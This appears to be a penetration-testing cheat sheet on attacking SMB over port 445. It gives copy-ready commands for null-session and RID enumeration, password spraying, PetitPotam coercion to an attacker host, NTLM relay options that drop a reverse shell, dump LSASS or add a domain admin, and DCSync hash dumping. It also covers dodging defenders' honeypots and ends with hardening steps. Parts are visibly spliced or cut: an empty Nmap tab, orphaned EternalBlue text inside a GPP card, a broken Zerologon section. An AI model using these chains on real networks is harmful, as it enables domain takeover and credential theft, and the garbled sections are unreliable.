## Overview

::callout
---
icon: i-lucide-info
color: info
---
**Port 445** runs **Server Message Block (SMB)** protocol directly over TCP. It is the **#1 most targeted port** in internal penetration testing and Active Directory attacks. SMB provides shared access to files, printers, serial ports, named pipes, and inter-process communication (IPC) between networked nodes.
::

| Property | Detail |
| -------------- | -------------------------------------------------- |
| `Port` | `445/TCP` |
| `Protocol` | `SMB / CIFS (Common Internet File System)` |
| `Service` | `microsoft-ds` |
| `Related Port` | `139/TCP (SMB over NetBIOS)` |
| `OS Target` | `Windows (Primary), Linux/macOS (Samba)` |
| `Risk Level` | `🔴 Critical` |
| `Versions` | `SMBv1 (dangerous), SMBv2, SMBv2.1, SMBv3, SMBv3.1.1` |

### SMB Version History & Risk

| Version | Introduced | Security Level | Notes |
| ------- | ---------- | -------------- | ----- |
| `SMBv1` | Windows 2000 | 🔴 **Extremely Dangerous** | EternalBlue, WannaCry — **MUST disable** |
| `SMBv2.0` | Windows Vista/2008 | 🟠 Moderate | Improved performance, still lacks encryption |
| `SMBv2.1` | Windows 7/2008R2 | 🟠 Moderate | Opportunistic locking improvements |
| `SMBv3.0` | Windows 8/2012 | 🟢 Good | AES-128-CCM encryption, secure dialect negotiation |
| `SMBv3.0.2` | Windows 8.1/2012R2 | 🟢 Good | SMBv1 can be disabled completely |
| `SMBv3.1.1` | Windows 10/2016+ | 🟢 Best | AES-128-GCM, pre-auth integrity, **but SMBGhost exists** |

### How SMB Authentication Works

::note
Understanding SMB authentication is **critical** for exploitation techniques like Pass-the-Hash, NTLM Relay, and credential capture.
::

```text [SMB Authentication Flow]
Client                                    Server
  |                                         |
  |  1. SMB_NEGOTIATE_REQUEST              |
  |  (List supported dialects)             |
  | -------------------------------------→ |
  |                                         |
  |  2. SMB_NEGOTIATE_RESPONSE             |
  |  (Selected dialect + challenge)        |
  | ←------------------------------------- |
  |                                         |
  |  3. SMB_SESSION_SETUP_REQUEST          |
  |  (NTLM/Kerberos authentication)       |
  | -------------------------------------→ |
  |                                         |
  |  4. SMB_SESSION_SETUP_RESPONSE         |
  |  (Success/Failure + Session ID)        |
  | ←------------------------------------- |
  |                                         |
  |  5. SMB_TREE_CONNECT (Share access)    |
  | -------------------------------------→ |
  |                                         |
  |  6. File Operations (Read/Write/List)  |
  | ←-----------------------------------→  |
```

::accordion

  :::accordion-item
  ---
  icon: i-lucide-key
  label: "NTLM Authentication (Challenge-Response)"
  ---

  Most common SMB authentication mechanism:

  1. **Negotiation** — Client sends supported dialects
  2. **Challenge** — Server sends 8-byte random challenge (nonce)
  3. **Response** — Client encrypts challenge with password hash (NTLMv1 or NTLMv2)
  4. **Verification** — Server verifies against stored hash

  **Key Point:** The actual password is **never sent over the wire**. Only the hash-encrypted challenge is sent, which is why **Pass-the-Hash** works — you only need the hash, not the password.

  | Auth Type | Hash Format | Crackability |
  | --------- | ----------- | ------------ |
  | `LM` | DES-based, 14 char max | 🔴 Trivially crackable |
  | `NTLMv1` | DES(NT-Hash, challenge) | 🔴 Easily crackable |
  | `NTLMv2` | HMAC-MD5 based | 🟠 Harder but crackable |
  | `Kerberos` | AES256/AES128 tickets | 🟢 Very hard to crack |

  :::

  :::accordion-item
  ---
  icon: i-lucide-share-2
  label: "Default SMB Shares"
  ---

  Every Windows machine has these built-in administrative shares:

  | Share | Purpose | Access Required |
  | ----- | ------- | --------------- |
  | `C$` | Default drive share | Local Admin |
  | `ADMIN$` | `%SystemRoot%` directory | Local Admin |
  | `IPC$` | Inter-Process Communication | Anonymous possible |
  | `NETLOGON` | Logon scripts (DC only) | Domain Users |
  | `SYSVOL` | Group Policy (DC only) | Domain Users |
  | `PRINT$` | Printer drivers | Varies |

  :::

## Reconnaissance

::tip
Reconnaissance on port 445 should identify: **open port → SMB version → OS version → signing status → hostname/domain → whether null sessions work**.
::

### Port Discovery

::tabs
  :::tabs-item{icon="i-lucide-code" label="Nmap"}

## Enumeration

::caution
Enumeration is the **most critical phase** for port 445. A single misconfigured share or leaked credential can compromise the entire domain.
::

### Null & Guest Session Testing

::note
**Always test null sessions first.** Many legacy and misconfigured systems allow anonymous access to SMB, revealing users, shares, groups, and password policies.
::

::steps{level="4"}

#### Test Authentication Methods

```bash [Terminal]
# Method 1 — Null session (empty user, empty pass)
crackmapexec smb <TARGET_IP> -u '' -p ''

# Method 2 — Null user with no password
crackmapexec smb <TARGET_IP> -u '' -p '' --shares

# Method 3 — Guest account
crackmapexec smb <TARGET_IP> -u 'guest' -p ''

# Method 4 — Anonymous with smbclient
smbclient -L //<TARGET_IP>/ -N

# Method 5 — rpcclient null session
rpcclient -U "" -N <TARGET_IP>

# Method 6 — smbmap
smbmap -H <TARGET_IP>
smbmap -H <TARGET_IP> -u '' -p ''
smbmap -H <TARGET_IP> -u 'guest' -p ''
smbmap -H <TARGET_IP> -u null -p ''
```

#### Interpret Results

```text [Output — CrackMapExec]
SMB  10.10.10.100  445  DC01  [*] Windows Server 2016 Standard 14393 x64
SMB  10.10.10.100  445  DC01  [+] \:                     ← Null session WORKS
SMB  10.10.10.100  445  DC01  [-] \guest: STATUS_ACCOUNT_DISABLED  ← Guest disabled
```

| Status | Meaning |
| ------ | ------- |
| `[+]` | Authentication successful |
| `[-] STATUS_LOGON_FAILURE` | Invalid credentials |
| `[-] STATUS_ACCOUNT_DISABLED` | Account exists but disabled |
| `[-] STATUS_ACCOUNT_LOCKED_OUT` | Account locked |
| `[-] STATUS_PASSWORD_EXPIRED` | Password expired |
| `[+] (Pwn3d!)` | **Admin access** — can execute commands |

### User Enumeration — Deep Dive

::steps{level="4"}

#### RPC-Based User Enumeration

```bash [Terminal]
# Connect with null session
rpcclient -U "" -N <TARGET_IP>

# ===== INSIDE RPCCLIENT =====

# Enumerate domain users
rpcclient $> enumdomusers

# Enumerate domain groups
rpcclient $> enumdomgroups

# Query domain info
rpcclient $> querydominfo

# Display user info
rpcclient $> querydispinfo
rpcclient $> querydispinfo2
rpcclient $> querydispinfo3

# Query specific user by RID
rpcclient $> queryuser 0x1f4      # Administrator (RID 500)
rpcclient $> queryuser 0x1f5      # Guest (RID 501)
rpcclient $> queryuser 0x1f6      # krbtgt (RID 502)
rpcclient $> queryuser 0x44f      # Custom user

# Query group members
rpcclient $> querygroupmem 0x200  # Domain Admins (RID 512)
rpcclient $> querygroupmem 0x201  # Domain Users (RID 513)

# Lookup user/group names
rpcclient $> lookupnames administrator
rpcclient $> lookupnames "domain admins"

# Enumerate alias groups
rpcclient $> enumalsgroups builtin
rpcclient $> enumalsgroups domain

# Query alias members (local groups)
rpcclient $> queryaliasmem builtin 0x220  # Administrators group

# Get SID from name
rpcclient $> lookupnames administrator

# Get name from SID
rpcclient $> lookupsids S-1-5-21-xxx-500

# Enumerate printers
rpcclient $> enumprinters

# Server info
rpcclient $> srvinfo

# NetShareEnum
rpcclient $> netshareenumall

# Domain password policy
rpcclient $> getdompwinfo

# Create user (if you have admin)
rpcclient $> createdomuser hacker
rpcclient $> setuserinfo2 hacker 24 'P@ssw0rd!'
```

#### RID Cycling / Brute Force

::warning
**RID cycling** is one of the most reliable user enumeration techniques. It works even when `enumdomusers` is restricted.
::

```bash [Terminal]
# CrackMapExec RID brute
crackmapexec smb <TARGET_IP> -u '' -p '' --rid-brute 10000
crackmapexec smb <TARGET_IP> -u 'guest' -p '' --rid-brute 10000

# NetExec
nxc smb <TARGET_IP> -u '' -p '' --rid-brute 10000

# Impacket lookupsid
impacket-lookupsid ''@<TARGET_IP>
impacket-lookupsid ''@<TARGET_IP> 20000

# With credentials
impacket-lookupsid 'corp.local/user:pass'@<TARGET_IP>

# Custom RID range with rpcclient
for i in $(seq 500 2000); do 
  rpcclient -U "" -N <TARGET_IP> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"
done
```

**Common RIDs to Check:**

| RID | Hex | Account |
| --- | --- | ------- |
| `500` | `0x1f4` | Administrator |
| `501` | `0x1f5` | Guest |
| `502` | `0x1f6` | krbtgt |
| `512` | `0x200` | Domain Admins |
| `513` | `0x201` | Domain Users |
| `514` | `0x202` | Domain Guests |
| `515` | `0x203` | Domain Computers |
| `516` | `0x204` | Domain Controllers |
| `519` | `0x207` | Enterprise Admins |
| `544` | `0x220` | Administrators (Builtin) |
| `1000+` | — | Custom users start here |


### Password Policy Enumeration

::note
**Always enumerate the password policy before brute forcing.** You need to know the lockout threshold to avoid locking accounts.
::

```bash [Terminal]
# enum4linux
enum4linux -P <TARGET_IP>

# CrackMapExec
crackmapexec smb <TARGET_IP> -u 'user' -p 'pass' --pass-pol

# NetExec
nxc smb <TARGET_IP> -u 'user' -p 'pass' --pass-pol

# rpcclient
rpcclient -U "user%pass" <TARGET_IP> -c "getdompwinfo"

# Impacket
impacket-samrdump <TARGET_IP>
```

**Critical Policy Values:**

| Policy | Safe Value | Dangerous Value |
| ------ | ---------- | --------------- |
| `Lockout Threshold` | `3-5 attempts` | `0 (no lockout)` ← 🔴 Unlimited brute force |
| `Lockout Duration` | `30+ minutes` | `1 minute` |
| `Lockout Observation` | `30+ minutes` | `1 minute` |
| `Min Password Length` | `12+` | `0-7` ← 🔴 Weak passwords |
| `Password History` | `24` | `0` ← 🔴 Password reuse |
| `Password Complexity` | `Enabled` | `Disabled` ← 🔴 Simple passwords |
| `Max Password Age` | `90 days` | `Never` ← 🔴 Stale passwords |

## Weak Points & Misconfigurations

::tip
These are the **most common weak points** that attackers exploit on port 445 during real-world engagements, CTFs, and red team operations.
::

::card-group

  ::card
  ---
  title: "Null Session Access"
  icon: i-lucide-unlock
  color: red
  ---
  Anonymous/null sessions allowed. Attacker enumerates users, shares, groups, and password policies **without any credentials**.

  **Check:** `crackmapexec smb <IP> -u '' -p ''`

  **Impact:** Full user list → password spray → domain compromise
  ::

  ::card
  ---
  title: "Guest Access Enabled"
  icon: i-lucide-user-x
  color: red
  ---
  Guest account enabled allowing unauthenticated share access. Common in legacy environments.

  **Check:** `crackmapexec smb <IP> -u 'guest' -p ''`

  **Impact:** Read sensitive files, enumerate users
  ::

  ::card
  ---
  title: "SMBv1 Enabled"
  icon: i-lucide-bug
  color: red
  ---
  SMBv1 is **deprecated and wormable**. Vulnerable to EternalBlue (MS17-010), WannaCry, NotPetya, EternalRomance.

  **Check:** `nmap -p 445 --script smb-protocols <IP>`

  **Impact:** Unauthenticated SYSTEM shell
  ::

  ::card
  ---
  title: "SMB Signing Disabled"
  icon: i-lucide-shield-off
  color: red
  ---
  Without SMB signing, attackers perform **NTLM relay attacks** to impersonate users on other machines.

  **Check:** `crackmapexec smb <RANGE> --gen-relay-list targets.txt`

  **Impact:** Privilege escalation, lateral movement, domain admin
  ::

  ::card
  ---
  title: "Writable Shares"
  icon: i-lucide-pencil
  color: red
  ---
  World-writable shares allow uploading **SCF, LNK, URL, desktop.ini** files for hash capture or malicious payloads.

  **Check:** `smbmap -H <IP>`

  **Impact:** NTLMv2 hash capture, code execution
  ::

  ::card
  ---
  title: "Sensitive Data in Shares"
  icon: i-lucide-file-warning
  color: red
  ---
  Shares containing `Groups.xml` (GPP passwords), config files, backup files, scripts with hardcoded passwords, database dumps.

  **Check:** `smbmap -H <IP> -R --depth 10`

  **Impact:** Credential theft, database access
  ::

  ::card
  ---
  title: "Weak/Default Credentials"
  icon: i-lucide-key
  color: red
  ---
  Default, blank, or weak passwords on SMB accounts. Easily brute-forced.

  **Check:** `crackmapexec smb <IP> -u users.txt -p passwords.txt`

  **Impact:** Authenticated access → potential admin
  ::

  ::card
  ---
  title: "No Account Lockout"
  icon: i-lucide-repeat
  color: red
  ---
  Missing lockout policy enables unlimited brute-force and password spray.

  **Check:** `crackmapexec smb <IP> -u 'user' -p 'pass' --pass-pol`

  **Impact:** Unlimited credential guessing
  ::

  ::card
  ---
  title: "NTLM Instead of Kerberos"
  icon: i-lucide-shield-question
  color: red
  ---
  Systems accepting NTLM authentication are vulnerable to relay attacks, capture attacks, and pass-the-hash.

  **Impact:** Hash capture, relay, lateral movement
  ::

  ::card
  ---
  title: "GPP Passwords (MS14-025)"
  icon: i-lucide-lock-open
  color: red

  Group Policy Preferences containing encrypted passwords in SYSVOL. The AES key was **publicly disclosed by Microsoft**.

  **Check:** `findstr /S cpassword \\<DC>\sysvol\*.xml`

  **Impact:** Instant password decryption

  **Impact:** Unrestricted exploitation

  ---

  **The most devastating SMB exploit in history.** Leaked from NSA's toolkit by Shadow Brokers in April 2017. Used in WannaCry ransomware (May 2017) that infected 230,000+ systems across 150+ countries, causing billions in damages.

  label: "CVE-2020-1472 — Zerologon"
  ---

  **Instant Domain Admin.** One of the most critical Active Directory vulnerabilities ever discovered. CVSS 10.0.

  **Affected:** All Windows Server versions running as Domain Controller (unpatched)

  **How It Works — Technical Deep Dive:**
  1. Exploits a cryptographic flaw in the **Netlogon Remote Protocol (MS-NRPC)**
  2. MS-NRPC uses AES-CFB8 encryption with a client challenge and session key
  3. The **IV (Initialization Vector) is always set to all zeros** — this is the bug
  4. With AES-CFB8, if both the plaintext and IV are all zeros, the ciphertext is also all zeros
  5. This happens with probability **1/256** for a random key
  6. Attacker sends authentication attempts with **all-zero client challenge**
  7. After ~256 attempts (takes seconds), the server accepts the authentication
  8. Attacker can then **set the Domain Controller machine account password to empty**
  9. With the DC machine account, attacker can use DCSync to dump all domain hashes
  10. Result: **Complete domain compromise in seconds**

  ---
  icon: i-lucide-skull
  label: "CVE-2021-36942 — PetitPotam"
  ---

  **Coerce NTLM authentication from Domain Controller to attacker's machine.** Combined with NTLM relay to AD CS, this achieves domain admin.

  **Affected:** All Windows Server versions

  **How It Works:**
  1. Abuses **EfsRpcOpenFileRaw()** function in MS-EFSRPC (Encrypting File System)
  2. Attacker sends unauthenticated API call to the DC
  3. DC makes an outbound NTLM authentication to the attacker's IP
  4. Attacker relays this authentication to **Active Directory Certificate Services (AD CS)**
  5. AD CS issues a certificate for the DC's machine account
  6. Attacker uses the certificate to request a TGT for the DC → **DCSync → all hashes**

  **Attack Chain:**
  ```bash [Terminal]
  # Step 1: Find AD CS server
  crackmapexec ldap <DC_IP> -u 'user' -p 'pass' -M adcs

  # Step 2: Start ntlmrelayx targeting AD CS
  impacket-ntlmrelayx -t http://<ADCS_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

  # Step 3: Trigger PetitPotam
  python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
  # Or with credentials:
  python3 PetitPotam.py -u 'user' -p 'pass' -d 'corp.local' <ATTACKER_IP> <DC_IP>

  # Step 4: Use captured certificate
  python3 gettgtpkinit.py corp.local/DC01$ -pfx-base64 <BASE64_CERT> DC01.ccache
  export KRB5CCNAME=DC01.ccache

  # Step 5: DCSync
  impacket-secretsdump -k -no-pass corp.local/DC01$@DC01.corp.local
  ```

  :::accordion-item
  ---
  icon: i-lucide-skull
  label: "NTLM Relay — SMB Signing Disabled"
  ---

  **Not a CVE, but the most common and impactful real-world SMB attack.**

  **Condition:** SMB signing **not required** on target (default on all non-DC Windows machines)

  **How It Works:**
  1. Attacker poisons **LLMNR/NBT-NS/mDNS** broadcast name resolution
  2. When a victim fails a DNS lookup, they broadcast a query
  3. Attacker responds: "I'm that server, authenticate to me"
  4. Victim sends NTLM authentication (challenge-response) to attacker
  5. Attacker relays authentication to another target where signing is disabled
  6. Attacker gains access to the relay target **as the victim user**
  7. If victim is a **local admin** on the relay target → full compromise

  **Full Attack Chain:**

  ```bash [Terminal]
  # ============================================
  # STEP 1: Identify relay targets (signing disabled)
  # ============================================
  crackmapexec smb <TARGET_RANGE>/24 --gen-relay-list relay_targets.txt
  cat relay_targets.txt

  # ============================================
  # STEP 2: Configure Responder (disable SMB & HTTP)
  # ============================================
  sudo nano /etc/responder/Responder.conf
  # Set: SMB = Off, HTTP = Off
  
  sudo responder -I eth0 -dwPv

  # ============================================
  # STEP 3: Start ntlmrelayx
  # ============================================
  
  # Option A: Dump SAM hashes
  impacket-ntlmrelayx -tf relay_targets.txt -smb2support

  # Option B: Interactive shell
  impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i

  # Option C: Execute command
  impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c 'whoami /all'

  # Option D: Deploy reverse shell
  impacket-ntlmrelayx -tf relay_targets.txt -smb2support -e /tmp/shell.exe

  # Option E: Dump LSASS
  impacket-ntlmrelayx -tf relay_targets.txt -smb2support --dump-lsass

  # Option F: Add domain admin (if relaying to LDAP on DC)
  impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user hacker

  # ============================================
  # STEP 4: Wait for victim authentication
  # ============================================
  # Hashes/shells will appear in ntlmrelayx output
  ```

## SMB Trap & Honeypot Detection

::warning
Be aware of **SMB honeypots** and traps that defenders may deploy to detect attackers.
::

### Indicators of Honeypots

| Indicator | Description |
| --------- | ----------- |
| **Too many shares** | Shares with enticing names like "Passwords", "Confidential", "HR_Data" |
| **Canary tokens** | Files that trigger alerts when opened (e.g., .docx with external template) |
| **Fake credentials** | `passwords.txt` with honeytokens that trigger alerts when used |
| **HoneySMB** | Dedicated SMB honeypots that log all interactions |
| **Unusual OS strings** | SMB server returning unexpected OS names |
| **Instant alert shares** | Shares that trigger immediate security alerts when accessed |
| **Deception platforms** | Solutions like Thinkst Canary, Attivo, Illusive Networks |

### How to Detect Honeypots

```bash [Terminal]
# Check for signs of a honeypot
# 1. OS fingerprint matches a known honeypot
nmap -O -p 445 <TARGET_IP>

# 2. Timing analysis (honeypots may respond differently)
# 3. Check if services seem "too perfect"
# 4. Verify share names against common honeypot patterns
# 5. Be cautious of shares named "passwords", "secret", "confidential"

# Canary token detection in documents
# Look for external template references in .docx files
unzip suspicious.docx
cat word/_rels/settings.xml.rels | grep -i "http\|external"
# If it contains an external URL → likely a canary token

# Check .url files
cat suspicious.url | grep -i "http\|\\\\.*\\"
```

### Safe Practices During Engagement

```bash [Terminal]
# 1. Don't open .docx/.xlsx directly — check for canaries first
# 2. Use 'strings' or 'file' command to analyze before opening
strings suspicious.docx | grep -i "http\|canary\|token"

# 3. Download files rather than opening from share
# 4. Analyze in isolated VM
# 5. Check file metadata
exiftool suspicious.docx

# 6. Don't use found credentials without authorization
# 7. Monitor your traffic for callbacks
```

## Troubleshooting Common Issues

::accordion

  :::accordion-item
  ---
  icon: i-lucide-circle-help
  label: "STATUS_ACCESS_DENIED on PsExec"
  ---

  **Causes & Solutions:**

  | Cause | Solution |
  | ----- | -------- |
  | Not local admin | Use an admin account |
  | UAC Remote Restrictions | Disable `LocalAccountTokenFilterPolicy` or use built-in Administrator |
  | ADMIN$ not accessible | Try C$ share instead, or use SmbExec |
  | Firewall blocking | Check Windows Firewall rules |
  | AV blocking | Use SmbExec or WmiExec (no binary on disk) |

  ```bash [Terminal]
  # Fix UAC Remote Restrictions (on target)
  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

  # Try alternative execution methods
  impacket-smbexec 'admin:pass'@<TARGET_IP>
  impacket-wmiexec 'admin:pass'@<TARGET_IP>
  impacket-atexec 'admin:pass'@<TARGET_IP> 'whoami'
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-circle-help
  label: "NT_STATUS_LOGON_FAILURE"
  ---

  **Common Causes:**

  | Cause | Solution |
  | ----- | -------- |
  | Wrong password | Verify credentials |
  | Wrong domain | Specify correct domain: `corp.local/user` |
  | Account locked | Check lockout policy, wait |
  | Account disabled | Try another account |
  | Account expired | Try another account |
  | NTLM disabled | Use Kerberos authentication |
  | Clock skew | Sync time with DC for Kerberos |

  ```bash [Terminal]
  # Test with explicit domain
  crackmapexec smb <TARGET_IP> -u 'user' -p 'pass' -d 'corp.local'
  
  # Test with local auth
  crackmapexec smb <TARGET_IP> -u 'admin' -p 'pass' --local-auth
  
  # Check if account locked
  crackmapexec smb <TARGET_IP> -u 'user' -p 'wrong_pass'
  # Look for: STATUS_ACCOUNT_LOCKED_OUT
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-circle-help
  label: "Connection Timeout / No Response"
  ---

  ```bash [Terminal]
  # 1. Check if port is actually open
  nc -zv <TARGET_IP> 445
  nmap -Pn -p 445 <TARGET_IP>

  # 2. Try with explicit protocol version
  smbclient -L //<TARGET_IP>/ -N --option='client min protocol=NT1'
  smbclient -L //<TARGET_IP>/ -N --option='client min protocol=SMB2'
  smbclient -L //<TARGET_IP>/ -N --option='client min protocol=SMB3'

  # 3. Check firewall
  nmap -Pn -sA -p 445 <TARGET_IP>  # ACK scan for firewall detection

  # 4. Try port 139 (NetBIOS SSN)
  smbclient -L //<TARGET_IP>/ -N -p 139

  # 5. Check routing
  traceroute -p 445 <TARGET_IP>
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-circle-help
  label: "smbclient — Protocol negotiation failed"
  ---

  ```bash [Terminal]
  # Target only supports newer protocols
  smbclient -L //<TARGET_IP>/ -N --option='client min protocol=SMB2' --option='client max protocol=SMB3'

  # Or older protocols
  smbclient -L //<TARGET_IP>/ -N --option='client min protocol=LANMAN1'

  # Edit /etc/samba/smb.conf
  [global]
  client min protocol = SMB2
  client max protocol = SMB3
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-circle-help
  label: "Kerberos Clock Skew Error"
  ---

  ```bash [Terminal]
  # Kerberos requires clocks within 5 minutes
  # Sync with DC
  sudo ntpdate <DC_IP>
  
  # Or manually set time
  sudo date -s "$(rpcclient -U '' -N <DC_IP> -c 'getdcname corp.local' 2>/dev/null)"
  
  # Or use faketime
  faketime '2024-01-15 10:30:00' impacket-psexec -k -no-pass 'admin'@<TARGET>
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-circle-help
  label: "NTLM Relay Not Working"
  ---

  | Issue | Solution |
  | ----- | -------- |
  | SMB signing required on target | Choose targets with signing disabled |
  | Relaying to same machine | Can't relay to the originating machine |
  | Responder SMB server on | Disable SMB/HTTP in Responder.conf |
  | Wrong ntlmrelayx options | Ensure `-smb2support` flag is set |
  | EPA/Channel Binding | Try relaying to different protocol (HTTP, LDAP) |
  | No incoming authentications | Use coercion (PetitPotam, PrinterBug) |

  ```bash [Terminal]
  # Debug relay
  impacket-ntlmrelayx -tf targets.txt -smb2support -debug

  # Verify Responder is catching traffic
  sudo responder -I eth0 -A  # Analyze mode only

  # Force trigger with coercion instead of waiting
  python3 PetitPotam.py <ATTACKER_IP> <DC_IP>
  ```

### Critical Remediations

::steps{level="4"}

#### Disable SMBv1 Immediately

```powershell [Terminal]
# Windows Server
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart

# Verify
Get-SmbServerConfiguration | Select EnableSMB1Protocol

# Group Policy
# Computer Configuration → Admin Templates → Network → Lanman Server
# → SMB v1: Disabled
```

#### Enable SMB Signing

```powershell [Terminal]
# Require SMB signing on all machines
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force

# Group Policy
# Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
# → Microsoft network server: Digitally sign communications (always): Enabled
# → Microsoft network client: Digitally sign communications (always): Enabled
```

#### Disable Null Sessions

```powershell [Terminal]
# Registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymous" -Value 2
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictAnonymousSAM" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "EveryoneIncludesAnonymous" -Value 0

# Remove null session pipes and shares
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "NullSessionPipes" -Value @()
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name "NullSessionShares" -Value @()
```

#### Disable Guest Account

```powershell [Terminal]
Disable-LocalUser -Name "Guest"
# Group Policy: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
# → Accounts: Guest account status: Disabled
```

#### Implement Strong Password Policies

```powershell [Terminal]
# Lockout threshold: 5 attempts
# Lockout duration: 30 minutes
# Password history: 24

# Group Policy
```

#### Enable LDAP Signing & Channel Binding

```powershell [Terminal]

# LDAP Channel Binding
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LdapEnforceChannelBinding" -Value 2
```

#### Disable Print Spooler on Servers

```powershell [Terminal]
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled

# Especially on Domain Controllers!
```
